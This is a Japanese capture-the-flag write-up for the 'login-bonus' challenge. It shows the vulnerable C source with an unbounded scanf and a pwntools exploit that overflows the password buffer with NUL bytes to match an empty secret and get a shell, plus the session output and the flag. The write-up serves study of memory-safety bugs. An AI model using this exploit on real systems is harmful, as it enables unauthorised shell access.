# login-bonus

> パスワードを当てられますか？
> 
> nc 34.170.146.252 6555

[login-bonus.tar.gz](https://alpacahack-prod.s3.ap-northeast-1.amazonaws.com/09648cac-c83d-4942-a5c8-ae855377c9c3/login-bonus.tar.gz)が提供される

解凍すると以下のファイル達がある。
```bash
login-bonus/
login-bonus/Dockerfile
login-bonus/flag.txt
login-bonus/login.c
login-bonus/compose.yaml
login-bonus/login
```

login.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/random.h>

#define debug_report(fmt, ...) printf("[DEBUG] " fmt "\n", ##__VA_ARGS__)

char password[32];
char secret[32];

int main() {
  /* Input password */
  printf("Password: ");
  scanf("%[^\n]", password);

  /* Check password */
  debug_report("Authenticating...");
  if (strcmp(password, secret)) {
    puts("[-] Wrong password");
    debug_report("'%s' != '%s'", password, secret);

  } else {
    puts("[+] Success!");
    system("/bin/sh");
  }

  return 0;
}

__attribute__((constructor))
void setup() {
  int seed;
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  /* Generate random password */
  debug_report("Generating secure password...");
  getrandom(&seed, sizeof(seed), 0);
  srand(seed);
  for (size_t i = 0; i < 16; i++)
    secret[i] = 'A' + (rand() % 26);
}
```

`scanf("%[^\n]", password);`が脆弱。
改行が来るまで無制限に読み込む。

メモリ構造は以下のようになっていると思われる。
```
[ password (32 bytes) ] [ secret (32 bytes) ]
```

passwordに32バイト以上書き込んでsecretを上書きする。
しかし通常passwordはsecretを含んだ長い文字列となるためsecretを一致させることは難しい。

なので、NULLバイト(`\n00`)を利用する。
NULLバイトを書き込むと、passwordもsecretも先頭がNULLバイトなためから文字列として扱われ一致させることができる。

exploit書く
```py
from pwn import *

# 接続情報
host = "34.170.146.252"
port = 6555

# 接続
io = remote(host, port)

# プロンプトを待つ
io.recvuntil(b"Password: ")

# 攻撃ペイロード
# password(32byte) + secret(32byte) を覆い尽くす量の NULLバイトを送る
# これにより、password="" かつ secret="" の状態を作り出す
payload = b'\x00' * 100

# 送信 (sendlineで末尾に改行が付くのでscanfが終了する)
io.sendline(payload)

# 成功すればシェルが取れるので対話モードへ
io.interactive()
```


```bash
> python solve.py
python solve.py
[+] Opening connection to 34.170.146.252 on port 6555: Done
[*] Switching to interactive mode
[DEBUG] Authenticating...
[+] Success!
$ ls
bin
boot
dev
etc
flag-d592fd27eb4de74af194fda7990796ec.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag-d592fd27eb4de74af194fda7990796ec.txt
Alpaca{h0w_d1d_U_gu3s5_i7}
$
[*] Closed connection to 34.170.146.252 port 6555
```

flag: `Alpaca{h0w_d1d_U_gu3s5_i7}`
